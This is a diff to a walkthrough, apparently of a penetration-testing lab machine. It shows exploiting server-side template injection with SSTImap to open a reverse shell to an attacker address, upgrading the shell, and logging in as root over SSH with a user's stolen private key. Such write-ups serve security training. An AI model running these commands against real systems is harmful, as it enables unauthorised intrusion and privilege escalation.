@@ -43,6 +43,62 @@ Outputs
 ```
 No results for dict_items([('ENV', 'production'), ('DEBUG', False), ('TESTING', False), ('PROPAGATE_EXCEPTIONS', None), ('PRESERVE_CONTEXT_ON_EXCEPTION', None), ('SECRET_KEY', None), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(days=31)), ('USE_X_SENDFILE', False), ('SERVER_NAME', None), ('APPLICATION_ROOT', '/'), ('SESSION_COOKIE_NAME', 'session'), ('SESSION_COOKIE_DOMAIN', None), ('SESSION_COOKIE_PATH', None), ('SESSION_COOKIE_HTTPONLY', True), ('SESSION_COOKIE_SECURE', False), ('SESSION_COOKIE_SAMESITE', None), ('SESSION_REFRESH_EACH_REQUEST', True), ('MAX_CONTENT_LENGTH', None), ('SEND_FILE_MAX_AGE_DEFAULT', None), ('TRAP_BAD_REQUEST_ERRORS', None), ('TRAP_HTTP_EXCEPTIONS', False), ('EXPLAIN_TEMPLATE_LOADING', False), ('PREFERRED_URL_SCHEME', 'http'), ('JSON_AS_ASCII', True), ('JSON_SORT_KEYS', True), ('JSONIFY_PRETTYPRINT_REGULAR', False), ('JSONIFY_MIMETYPE', 'application/json'), ('TEMPLATES_AUTO_RELOAD', None), ('MAX_COOKIE_SIZE', 4093)])
 ```
+https://github.com/vladko312/SSTImap
+
+This tool allows us to easily identify SSTI as well.
+
+SSTImap
+```
+./sstimap.py -u http://10.10.110.60/products\?search\=john --reverse-shell 10.10.14.21 1234
+
+```
+Results
+```
+posix-linux $ whoami
+walter
+posix-linux $ 
+```
+
+Interactive Shell
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+Looking further into walters files I find this, I couldn't find anything in linpeas. 
+
+Using walkters id_rsa allowed us to login as root
+
+```
+❯ nano id_rsa
+❯ chmod 600 id_rsa
+❯ ssh -i id_rsa root@10.10.110.60
+The authenticity of host '10.10.110.60 (10.10.110.60)' can't be established.
+ED25519 key fingerprint is SHA256:P/+Aph3Jdlnz0ANn27+57+Fnv2PlXIOn7bEWKGbST5c.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.110.60' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 22.04 LTS (GNU/Linux 5.15.0-41-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon Apr  3 04:27:52 PM UTC 2023
+
+  System load:  0.2119140625      Processes:               221
+  Usage of /:   87.2% of 4.52GB   Users logged in:         0
+  Memory usage: 22%               IPv4 address for ens160: 192.168.1.60
+  Swap usage:   0%
+
+  => / is using 87.2% of 4.52GB
+  => There are 5 zombie processes.
 
 
+0 updates can be applied immediately.
 
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Sat Jul 23 05:33:01 2022
+root@APP01-Hades:~# 
+```
